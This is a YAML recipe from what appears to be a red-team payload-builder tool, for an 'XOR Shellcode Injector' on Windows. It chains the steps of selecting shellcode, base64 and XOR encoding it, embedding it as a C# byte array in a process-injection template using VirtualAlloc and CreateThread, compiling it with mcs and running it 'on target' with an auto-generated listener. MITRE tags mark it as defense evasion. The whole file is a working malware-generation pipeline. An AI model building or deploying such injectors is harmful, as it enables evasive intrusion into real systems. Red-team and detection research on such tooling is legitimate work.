meta:
  name: "XOR Shellcode Injector (with Shellcode Config)"
  category: "Examples"
  description: |
    Example recipe demonstrating the new shellcode configuration feature.
    Uses the shellcodes.yaml file to select shellcode generation method.
    
    This replaces the old "option" preprocessing type with the new
    "shellcode" type for cleaner configuration and automatic listener generation.

  effectiveness: "medium"
  platform: "Windows"

  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1027 - Obfuscated Files or Information"

  artifacts:
    - "XOR-encoded shellcode in binary"
    - "Simple decode loop in code"
    - "VirtualAlloc and CreateThread API calls"

parameters:
  - name: "xor_key"
    type: "hex"
    description: "XOR key (single byte, e.g., 'fa')"
    required: false
    default: "fa"

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: true
    default: "xor_injector.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory"
    required: true
    default: "{config.output_dir}"

preprocessing:
  # NEW: Use shellcode type instead of option type
  # The GUI will load available shellcodes from shellcodes.yaml
  # and present them as a dropdown with their specific parameters
  - type: "shellcode"
    name: "Select shellcode generation method"
    output_var: "raw_shellcode"

  # Step 2: Base64 encode for processing
  - type: "script"
    name: "encode_b64"
    script: "base64_encode.py"
    args:
      data: "{{ raw_shellcode }}"
    output_var: "shellcode_b64"

  # Step 3: XOR encrypt with key
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ shellcode_b64 }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 4: Format as C# byte array
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "csharp_payload"

output:
  type: "template"
  template: "process_injection/xor_injector.cs"

  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"

  launch_instructions: |
    # The listener command will be automatically generated and inserted above
    # if the selected shellcode from shellcodes.yaml has a listener defined

    # Execute on target
    {{ output_file }}

    # Note: Payload is XOR-encoded with key 0x{{ xor_key }}
